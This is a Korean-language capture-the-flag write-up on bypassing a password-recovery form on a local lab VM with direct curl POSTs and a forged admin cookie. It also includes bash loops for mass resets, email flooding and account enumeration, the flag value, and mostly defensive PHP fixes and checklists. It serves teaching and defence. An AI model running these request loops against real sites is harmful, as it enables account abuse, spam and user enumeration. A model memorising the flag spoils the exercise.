# Breach #10: 비밀번호 찾기 검증 우회

## 취약점 개요

**취약점 유형**: 인증 우회, 서버 측 검증 누락
**위험도**: 높음
**공격 벡터**: 직접 HTTP 요청, 쿠키 조작

비밀번호 복구 페이지가 적절한 인증이나 검증 없이 POST 요청을 수락하여, 공격자가 프론트엔드 제한을 우회하고 임의의 이메일 주소에 대해 비밀번호 재설정 기능을 트리거할 수 있습니다.

## 취약점 발견 과정

### 1단계: 비밀번호 복구 페이지 확인
**URL**: `http://192.168.64.2/index.php?page=recover`

비밀번호 복구 페이지에는 비밀번호 재설정을 위한 이메일 주소 제출 폼이 있습니다.

![비밀번호 복구 페이지](./images/01-recover-password-page.png)

### 2단계: 폼 제출 분석
브라우저 개발자 도구의 Network 탭에서 폼 제출 시 요청을 검사:

**요청 세부사항**:
- **메서드**: POST
- **URL**: `http://192.168.64.2/index.php?page=recover`
- **Body**: `mail=user@example.com&Submit=Submit`

![Network 탭의 POST 요청](./images/02-network-post-request.png)

**핵심 발견**: 인증이 필요 없고, 이메일 검증은 클라이언트 측에서만 발생합니다.

### 3단계: 직접 POST 요청으로 우회

임의의 이메일 주소로 POST 요청 전송:

```bash
curl -X POST 'http://192.168.64.2/?page=recover' \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "mail=test@example.com&Submit=Submit"
```

**응답**:
```html
<h2>The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2>
```

### 대안: 관리자 쿠키 사용

Breach #12에서 발견한 관리자 쿠키를 사용해도 취약점을 악용할 수 있습니다:

```bash
curl -X POST 'http://192.168.64.2/?page=recover' \
     -b 'I_am_admin=68934a3e9455fa72420237eb05902327' \
     -d 'Submit=Submit'
```

![DevTools의 관리자 쿠키](./images/03-cookies-admin.png)

이는 서버가 인증 상태를 제대로 검증하지 않는다는 것을 보여줍니다.

## 취약점 상세 설명

### 무엇이 잘못되었나?

#### 1. 인증 없음
비밀번호 복구 엔드포인트가 다음을 검증하지 않고 요청을 수락합니다:
- 사용자가 로그인했는지
- 사용자가 비밀번호를 재설정할 권한이 있는지
- 요청이 인증된 세션에서 왔는지

#### 2. 서버 측 검증 누락
```php
// 취약한 코드 (가설)
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['mail'];
    // 검증 없음!
    sendPasswordReset($email);
    echo "비밀번호 재설정 이메일이 전송되었습니다!";
}
?>
```

#### 3. 프론트엔드 전용 보안
폼에 클라이언트 측 검증이 있을 수 있습니다:
```html
<form method="POST">
    <input type="email" name="mail" required>
    <button type="submit">제출</button>
</form>
```

하지만 이는 직접 HTTP 요청으로 쉽게 우회됩니다.

### 신뢰 경계 위반

```
┌─────────────────┐         ┌─────────────────┐
│   브라우저        │         │   서버           │
│  (공격자)         │────────>│  (신뢰함)        │
└─────────────────┘         └─────────────────┘
 프론트엔드 우회            백엔드 검사 없음
 임의 이메일 전송           모든 요청 수락
```

서버는 검증 없이 모든 들어오는 요청을 신뢰합니다.

### 왜 이것이 위험한가?

#### 1. 계정 탈취
- 공격자가 임의 사용자의 비밀번호를 재설정할 수 있음
- 관리자 계정 포함 모든 계정 접근 가능

#### 2. 정보 노출
- 서버가 민감한 정보(플래그)를 노출
- 응답에서 시스템 내부 정보 유출

#### 3. 제한 없음
- 무제한 비밀번호 재설정 요청 가능
- Rate limiting 없음

#### 4. 이메일 검증 없음
- 시스템이 이메일 소유권을 확인하지 않음
- 존재하지 않는 이메일도 수락

## 공격 시나리오

### 시나리오 1: 대량 비밀번호 재설정 공격
```bash
# 모든 사용자의 비밀번호 재설정
for email in $(cat user_emails.txt); do
    curl -X POST 'http://192.168.64.2/?page=recover' \
         -d "mail=$email&Submit=Submit"
done
```

**영향**: 모든 사용자 로그아웃, 자격 증명 손상

### 시나리오 2: 특정 계정 표적 공격
```bash
# 고가치 계정 표적
curl -X POST 'http://192.168.64.2/?page=recover' \
     -d "mail=admin@company.com&Submit=Submit"
```

**영향**: 관리자 접근 권한 손상

### 시나리오 3: 서비스 거부 공격
```bash
# 정상 사용자에게 재설정 이메일 스팸
while true; do
    curl -X POST 'http://192.168.64.2/?page=recover' \
         -d "mail=victim@example.com&Submit=Submit"
    sleep 1
done
```

**영향**: 이메일 폭주, 서비스 중단

### 시나리오 4: 계정 열거
```bash
# 유효한 이메일 주소 찾기
for email in $(cat potential_emails.txt); do
    response=$(curl -X POST 'http://192.168.64.2/?page=recover' \
                    -d "mail=$email&Submit=Submit" 2>&1)
    if [[ $response == *"success"* ]]; then
        echo "Valid: $email"
    fi
done
```

**영향**: 등록된 사용자 이메일 목록 노출

## 방어 방법

### 1. 적절한 인증 구현

```php
<?php
session_start();

// 인증 필요
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die(json_encode(['error' => '인증이 필요합니다']));
}

// 사용자가 자신의 비밀번호만 재설정할 수 있도록
$user_id = $_SESSION['user_id'];
$requested_email = $_POST['mail'];

if (!isUserOwnEmail($user_id, $requested_email)) {
    http_response_code(403);
    die(json_encode(['error' => '권한이 없습니다']));
}
?>
```

### 2. 안전한 재설정 토큰 생성

```php
<?php
function generateResetToken($email) {
    // 암호학적으로 안전한 토큰 생성
    $token = bin2hex(random_bytes(32));

    // 만료 시간과 함께 저장
    $expiry = time() + (15 * 60); // 15분
    storeResetToken($email, $token, $expiry);

    return $token;
}

function sendPasswordResetEmail($email, $token) {
    $reset_link = "https://example.com/reset?token=$token";

    $message = "비밀번호를 재설정하려면 이 링크를 클릭하세요: $reset_link";
    $message .= "\n이 링크는 15분 후에 만료됩니다.";
    $message .= "\n요청하지 않았다면 이 이메일을 무시하세요.";

    mail($email, "비밀번호 재설정", $message);
}
?>
```

### 3. 이메일 소유권 검증

```php
<?php
// 이메일로 토큰 전송
$token = generateResetToken($email);
sendPasswordResetEmail($email, $token);

// 사용자는 이메일 소유권을 증명해야 함
function resetPassword($token, $new_password) {
    $reset = getResetTokenData($token);

    if (!$reset || $reset['expiry'] < time()) {
        throw new Exception('유효하지 않거나 만료된 토큰입니다');
    }

    // 토큰이 유효하면 비밀번호 재설정 허용
    updatePassword($reset['email'], $new_password);
    deleteResetToken($token); // 일회용 토큰
}
?>
```

### 4. Rate Limiting 구현

```php
<?php
class RateLimiter {
    private $redis;
    private $max_attempts = 3;     // 최대 시도 횟수
    private $window = 3600;        // 1시간

    public function checkLimit($identifier) {
        // 이메일과 IP 주소 모두 제한
        $email_key = "reset:email:" . $identifier['email'];
        $ip_key = "reset:ip:" . $identifier['ip'];

        $email_attempts = $this->redis->incr($email_key);
        $ip_attempts = $this->redis->incr($ip_key);

        if ($email_attempts === 1) {
            $this->redis->expire($email_key, $this->window);
        }
        if ($ip_attempts === 1) {
            $this->redis->expire($ip_key, $this->window);
        }

        if ($email_attempts > $this->max_attempts ||
            $ip_attempts > $this->max_attempts * 5) {
            throw new Exception('너무 많은 재설정 시도입니다');
        }
    }
}

// 사용
$limiter = new RateLimiter($redis);
$limiter->checkLimit([
    'email' => $_POST['mail'],
    'ip' => $_SERVER['REMOTE_ADDR']
]);
?>
```

### 5. CSRF 보호 추가

```php
<?php
// CSRF 토큰 생성
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// CSRF 토큰 검증
if (!isset($_POST['csrf_token']) ||
    $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    die('CSRF 토큰 검증 실패');
}

// 새로운 CSRF 토큰 생성 (재사용 방지)
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
?>
```

### 6. CAPTCHA 추가

```php
<?php
// Google reCAPTCHA v3 검증
function verifyCaptcha($token) {
    $secret = getenv('RECAPTCHA_SECRET');
    $response = file_get_contents(
        "https://www.google.com/recaptcha/api/siteverify?" .
        "secret=$secret&response=$token"
    );

    $data = json_decode($response);

    if (!$data->success || $data->score < 0.5) {
        throw new Exception('CAPTCHA 검증 실패');
    }
}

verifyCaptcha($_POST['captcha_token']);
?>
```

### 7. 안전한 비밀번호 재설정 흐름

```
┌──────────┐
│ 1. 사용자  │ 재설정 요청 (CAPTCHA 포함)
└────┬─────┘
     ↓
┌────▼─────┐
│ 2. 서버   │ ✓ 이메일 존재 확인
└────┬─────┘ ✓ Rate limiting 검사
     ↓       ✓ 안전한 토큰 생성 (32+ bytes)
┌────▼─────┐ ✓ 15분 만료 시간 설정
│ 3. 이메일  │ 토큰 링크 전송
└────┬─────┘ "요청하지 않았다면 무시하세요"
     ↓
┌────▼─────┐
│ 4. 사용자  │ 링크 클릭 (이메일 소유권 증명)
└────┬─────┘
     ↓
┌────▼─────┐
│ 5. 서버   │ ✓ 토큰 유효성 검증
└────┬─────┘ ✓ 만료 시간 확인
     ↓       ✓ 일회용 토큰 확인
┌────▼─────┐
│ 6. 사용자  │ 새 비밀번호 설정
└────┬─────┘ (강력한 비밀번호 요구사항)
     ↓
┌────▼─────┐
│ 7. 서버   │ ✓ 비밀번호 업데이트
└──────────┘ ✓ 모든 세션 무효화
             ✓ 보안 이벤트 로깅
             ✓ 토큰 삭제
             ✓ 사용자에게 알림 이메일
```

## 실제 영향 사례

### 유사 취약점 사례

#### 1. Instagram (2017)
**취약점**: 비밀번호 재설정 취약점으로 계정 탈취 가능
**영향**: 수백만 계정 위험
**해결**: 토큰 검증 강화, rate limiting 추가

#### 2. Uber (2016)
**취약점**: 재설정 토큰 추측으로 드라이버 계정 손상
**영향**: 드라이버 개인정보 및 수입 정보 노출
**해결**: 토큰 길이 증가, 복잡도 향상

#### 3. PayPal (2014)
**취약점**: 재설정 토큰 조작으로 무단 접근 가능
**영향**: 사용자 금융 정보 위험
**해결**: 토큰 암호화, 이중 인증 추가

### 결과

- **계정 탈취**: 사용자 계정에 대한 완전한 접근
- **데이터 유출**: 개인정보, 금융 데이터 접근
- **평판 손상**: 사용자 신뢰 상실
- **규제 벌금**: GDPR, CCPA 위반
- **법적 책임**: 피해 사용자로부터의 소송

## 보안 모범 사례

### OWASP 권장사항

1. **인증**: 항상 사용자 신원 확인
2. **권한 부여**: 민감한 작업에 대한 권한 확인
3. **Rate Limiting**: 남용 및 열거 방지
4. **안전한 토큰**: 암호학적으로 안전, 일회용, 시간 제한
5. **이메일 검증**: 작업 전 이메일 소유권 증명
6. **감사 로깅**: 모든 비밀번호 재설정 시도 추적
7. **HTTPS 전용**: 모든 통신 암호화
8. **CAPTCHA**: 자동화 공격 방지

### 구현 체크리스트

#### 필수 항목
- [ ] 비밀번호 재설정 시작 시 인증 필요
- [ ] 암호학적으로 안전한 토큰 생성 (32+ bytes)
- [ ] 토큰 만료 설정 (15분 권장)
- [ ] 일회용 토큰 구현
- [ ] Rate limiting 추가 (시간당 이메일당 3회 시도)
- [ ] 봇 방지를 위한 CAPTCHA 사용
- [ ] 이메일로만 재설정 링크 전송
- [ ] 토큰 클릭을 통한 이메일 소유권 검증

#### 보안 강화
- [ ] 비밀번호 변경 후 모든 세션 무효화
- [ ] IP 주소와 함께 모든 재설정 시도 로깅
- [ ] CSRF 보호 구현
- [ ] 모든 비밀번호 재설정 흐름에 HTTPS 사용
- [ ] 비밀번호 변경 시 사용자에게 알림
- [ ] 에러 메시지에 민감 정보 미포함
- [ ] 타이밍 공격 방지 (일정한 응답 시간)

#### 모니터링 및 대응
- [ ] 비정상적인 재설정 패턴 모니터링
- [ ] 실시간 경고 시스템 구현
- [ ] 정기적인 보안 감사 수행
- [ ] 침해 대응 계획 수립

## 참고 자료

- [OWASP - Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [CWE-640: Weak Password Recovery Mechanism](https://cwe.mitre.org/data/definitions/640.html)
- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

## 플래그

```
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```
